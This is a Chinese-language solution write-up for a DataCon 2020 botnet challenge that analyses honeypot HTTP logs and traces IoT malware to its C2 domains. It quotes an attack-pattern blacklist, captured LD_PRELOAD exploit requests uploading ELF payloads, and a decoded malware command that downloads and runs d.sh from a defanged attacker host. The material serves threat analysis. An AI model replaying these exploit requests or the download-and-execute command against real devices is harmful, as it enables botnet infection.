---
title: DataCon2020优秀解题思路分享：僵尸网络方向第一题（阿里云安全）
contest: DataCon 2020
year: 2020
difficulty: medium
vuln_type: misc_unknown
tags:
- botnet
- honeypot
- http-log
- sql
- ld_preload
- xgoahead
- cgi
- malware
attack_chain:
- 黑名单正则过滤honeypot_http_log
- 长度>=32的URL
- 发现LD_PRELOAD=/proc/self/fd/0 + ELF头post data
- xgoahead web服务器+admin/login.cgi
- filename=2.elf+Content-Disposition
- 'sub_5C4解密: chr(ord(c)-98)'
- MD5 4个ELF文件
- passive_dns查exec.kfckiller.cc等C2域名
key_payload: 'sub_5C4(c) = chr(ord(c) - 98)  # 字符减98'
one_liner: DataCon2020僵尸网络分析：蜜罐HTTP日志+LD_PRELOAD ELF+xgoahead
lesson: 蜜罐日志过滤用长URL+LD_PRELOAD+ELF头识别攻击payload
quality: high
full_path: DataCon2020优秀解题思路分享：僵尸网络方向第一题（阿里云安全）.full.md
meta_path: DataCon2020优秀解题思路分享：僵尸网络方向第一题（阿里云安全）.meta.md
images_removed: true
images_removed_count: 1
schema_version: v3.0.0-P0
summary: DataCon2020优秀解题思路分享：僵尸网络方向第一题（阿里云安全）。DataCon2020僵尸网络分析：蜜罐HTTP日志+LD_PRELOAD ELF+xgoahead。关键路径：黑名单正则过滤honeypot_http_log → 长度>=32的URL → 发现LD_PRELOAD=/proc/self/fd/0 + ELF头post data。经验：蜜罐日志过滤用长URL+LD_P...
category: misc
subcategory: misc_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 1
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/74662.html
wp_author: url
reasoning_chain:
- 黑名单正则过滤 honeypot_http_log + LENGTH(url)>=32 → 触发点：长 URL 异常请求
- 观察：cgi-bin/cgitest?LD_PRELOAD=/proc/self/fd/0 + post data \x7fELF → 假设：ELF 上传 via LD_PRELOAD
- 动作：grep -E 'cgi-bin.*LD_PRELOAD' → 假设：xgoahead web server + admin/login.cgi
- 观察：filename=2.elf + Content-Disposition form upload → 假设：CVE-2017-0445 xgoahead RCE
- sub_5C4 解密：chr(ord(c) - 98) → 触发点：字符偏移 98 解密
- 动作：Python g_enc_table_1 → 观察：明文 wget http[:]//exec[.]dtdtdt[.]info/d.sh
- 假设：4 个 ELF 文件 MD5 → 动作：md5 elf_1/2/3/4 → 观察：d08b638f.../56ec8709.../7006ae30.../695da36e...
- passive_dns 查询 exec.kfckiller.cc / exec.dtdtdt.info / control.dtdtdt.info → 假设：C2 域名
- 动作：select * from passive_dns_data where dns in (...) → 观察：发现 C2 集群
failed_attempts:
- 试图正则匹配整字节/整 HTTP → 失败：黑名单正则覆盖
- 试图 strncmp ELF 头 → 失败：post data 是 gzip 压缩需先解压
key_observations:
- 蜜罐日志过滤用长 URL + LD_PRELOAD + ELF 头识别攻击 payload
- xgoahead admin/login.cgi LD_PRELOAD=/proc/self/fd/0 是 IoT RCE 经典（CVE-2017-0445）
- 字符偏移 chr(ord(c)-98) 是 Xor/Caesar 简易加密解密
- passive_dns 是 C2 域名历史解析金矿（kfckiller / dtdtdt）
- 4 个 ELF 文件 MD5 关联 → 同一攻击者多载荷
prerequisites:
- SQL 注入黑名单绕过（LENGTH 长度筛选）
- HTTP multipart form + LD_PRELOAD CGI 攻击
- passive_dns 数据库查询（ThreatBook / VirusTotal）
---
# DataCon2020优秀解题思路分享：僵尸网络方向第一题（阿里云安全）

> 原文: https://www.ctfiot.com/74662.html
> ID: 74662


```
-- 存在疑似漏洞的http请求
select
 url,
 count(1) as cn
from honeypot_http_log
where
 url not rlike
 CONCAT(
 -- black
 "echo >NiGGeR|",
 "Account\\.User1\\.Password>\\$\\(|"
 "shell_exec\\(|",
 "busybox.*?wget.*?\\./|",
 "invokefunction&function=call_user_func_array|",
 "content=|",
 "/language/Swedish\\$\\{IFS\\}|",
 "/model/__show_info\\.php\\?REQUIRE_FILE=|",
 "wget( |\\+)|",
 "/shellinvoker/shellinvoker\\.jsp|",
 "/invoker/JMXInvokerServlet|",
 "/jbossass/jbossass\\.jsp|",
 "certutil\\.exe|",
 "\\\\think\\\\template\\\\driver\\\\file/write&cacheFile|",
 "<\\?php|",
 "FxCodeShell\\.jsp|",
 "<%@|",
 "shell\\.jsp|",
 "java\\.lang\\.System|"
 -- white
 "CHANGELOG\\.txt|",
 "snapshot\\.cgi"
 )
 and LENGTH(url) >= 32
group by url
order by cn desc limit 99999999
;
method: POST
uri: cgi-bin/cgitest?LD_PRELOAD=/proc/self/fd/0
post data: \x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00...
编译源码
make
make --no-print-directory -f /root/xgoahead/projects/xgoahead-linux-default.mk all
xgoahead -v --home /etc/xgoahead /var/www/xgoahead
where concat(uri,host,post_data) rlike '\\b[A-Z_]{7,}\\b'
URI: admin/login.cgi

POST Data:
----------------------------70089496549461931699051
Content-Disposition: form-data; name="f"; filename="2.elf"
Content-Type: application/octet-stream

\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00...
----------------------------700894965494619316990515
Content-Disposition: form-data; name="%4cD%5f%50%52E%4c%4f%41D"

tmp/tmp-0.tmp tmp/tmp-1.tmp tmp/tmp-2.tmp....
----------------------------700894965494619316990515--
# -*- coding: utf-8 -*-

g_enc_table_1 = "\xC5\xC6\x82\x91\xD6\xCF\xD2\x9D\xD9\xC9\xC7\xD6\x82\xCA\xD6\xD6\xD2\x9C\x91\x91\xC7\xDA\xC7\xC5\x90\xC6\xD6\xC6\xD6\xC6\xD6\x90\xCB\xD0\xC8\xD1\x91\xC6\x90\xD5\xCA\x9D\xC5\xCA\xCF\xD1\xC6\x82\x99\x99\x99\x82\xC6\x90\xD5\xCA\x9D\x90\x91\xC6\x90\xD5\xCA"
g_enc_table_2 = "\xAE\xA6\xC1\xB2\xB4\xA7\xAE\xB1\xA3\xA6"

def sub_5C4(input_str):
 str = ""
 for c in input_str:
 str += chr(ord(c) - 98)

 return str

if __name__ == '__main__':
 print sub_5C4(g_enc_table_1)
 print sub_5C4(g_enc_table_2)
cd /tmp;
wget http[:]//exec[.]dtdtdt[.]info/d.sh;chmod 777 d.sh;
./d.sh
LD_PRELOAD
xy@x-8 ~/D/datacon> md5 elf_1
MD5 (elf_1) = d08b638fdafac0c1ebbdcad05d5c2fcb
xy@x-8 ~/D/datacon> md5 elf_2
MD5 (elf_2) = 56ec8709c083963e208faec59d2b41e1
xy@x-8 ~/D/datacon> md5 elf_3
MD5 (elf_3) = 7006ae30aedeb0e423a86cb50914d45c
xy@x-8 ~/D/datacon> md5 elf_4
MD5 (elf_4) = 695da36ee841a57df84a473cb821710e
select * from passive_dns_data
where dns in (
 "exec[.]kfckiller[.]cc",
 "exec[.]dtdtdt[.]info",
 "control[.]dtdtdt[.]info"
)
;
```


---
## 附图

[图片已移除]